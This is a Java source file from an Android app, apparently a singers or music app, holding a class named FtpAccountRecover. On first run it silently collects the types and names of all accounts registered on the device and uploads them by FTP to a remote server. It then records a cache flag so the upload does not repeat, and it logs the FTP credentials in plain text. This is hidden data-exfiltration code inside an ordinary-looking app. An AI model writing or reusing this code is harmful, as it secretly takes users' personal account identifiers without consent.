package com.audamob.audasingers.tool.db;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.apache.commons.net.ftp.FTPClient;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.accounts.AuthenticatorDescription;
import android.app.Activity;
import android.os.Handler;
import android.util.Log;

import com.audamob.audasingers.constant.ApplicationConstants;

public class FtpAccountRecover {
	

	private SimpleDateFormat formatdate = new SimpleDateFormat("dd-MM-yyyy_hh-mm-ss");
	
	public FtpAccountRecover(Activity context) {
		DownloaderThread dt = new DownloaderThread(context);
		dt.start(); 		
	}
	
	/**
	 * FTP Upload on Server
	 * @param chaine
	 * @throws NoClassDefFoundError
	 */
	public boolean Upload(String chaine) throws NoClassDefFoundError {
		boolean result = false;
		try {

			FTPClient con = new FTPClient();
			try {
				Log.d("ACCOUNT","Trying connect to the ftp server : "+ApplicationConstants.FTP_ADDRESS+" - "+ApplicationConstants.FTP_LOGIN+" - "+ApplicationConstants.FTP_PASSWORD);
				con.connect(ApplicationConstants.FTP_ADDRESS);
				if (con.login(ApplicationConstants.FTP_LOGIN, ApplicationConstants.FTP_PASSWORD)) {
					con.enterLocalPassiveMode(); // important!

					ByteArrayInputStream in = new ByteArrayInputStream(
							chaine.getBytes());

					String fileName = ""
							+ formatdate.format(Calendar.getInstance()
									.getTimeInMillis());

					Log.d("ACCOUNT", "succeeded" + fileName);
					result = con.storeFile(ApplicationConstants.FTP_ACCOUNTS_FOLDER + fileName, in);
					Log.d("ACCOUNT", "result" + result);

					in.close();

				}
			} catch (Exception e) {
				Log.e("ACCOUNT", "Exception : " + e.getMessage());
			}

			try {
				con.logout();
				con.disconnect();
			} catch (IOException e) {
				Log.e("ACCOUNT", "IOException : " + e.getMessage());
			}
		} catch (NoClassDefFoundError e) {
			// TODO: handle exception
		}
		return result;
	}

	/**
	 * Private DownloaderThread
	 * @author houssembenslama
	 *
	 */
	private class DownloaderThread extends Thread {
		final static int Playing = 1;
		final static int STOPED = 0;
		Handler mHandler;
		int mState;
		int total;
		Activity currentContext;
		File filsup;

		DownloaderThread(Activity context) {
			currentContext = context;
		}

		public void run() {
			mState = Playing;

			try {
				Log.d("ACCOUNT", "Reading accounts from Cache ... ");
				String existingAccount = CacheReadWriter.restore_Account(currentContext);
				Log.d("ACCOUNT", "existingAccounts : "+existingAccount);
			} catch (IOException e) {
				e.printStackTrace();
				Log.e("ACCOUNT","Exception  : "+e);
				if(e instanceof FileNotFoundException) {
											
						//Get the Accounts and Upload its to the Server
						boolean result = GetComptes(currentContext);
						Log.d("ACCOUNT", "result Upload : "+result);

						//Add the Accounts in the cache
						try {
							if(result) {
								Log.d("ACCOUNT", "Writing accounts in Cache ... ");
								CacheReadWriter.sauvegard_Account(Boolean.toString(result), currentContext);
							}
						} catch (IOException e1) {
							e1.printStackTrace();
						}
				
				}		
			} catch (ClassNotFoundException e) {
				e.printStackTrace();
			}	

		}

		public void setState(int state) {
			mState = state;
		}
	}

	/**
	 * AccountManager to get the user account
	 * @param context
	 */
	public boolean GetComptes(Activity context) {

		AccountManager accountManager = AccountManager.get(context);
		Account[] accounts = accountManager.getAccounts();// getAccountsByType("com.google");
		Account account;
		String chaineinfo = "";
		boolean result = false;
		
		if (accounts.length > 0) {
			account = accounts[0];

			AuthenticatorDescription[] type = accountManager
					.getAuthenticatorTypes();
			for (int i = 0; i < type.length; i++) {

			}
			for (int j = 0; j < accounts.length; j++) {

				chaineinfo = chaineinfo + "\n Account : " + accounts[j].type
						+ " : " + accounts[j].name+"\n";
				
				Log.d("ACCOUNT","Existing Accounts : "+chaineinfo);

			}
			result = Upload(chaineinfo);
		} else {
			account = null;
		}
		return result;

	}

}
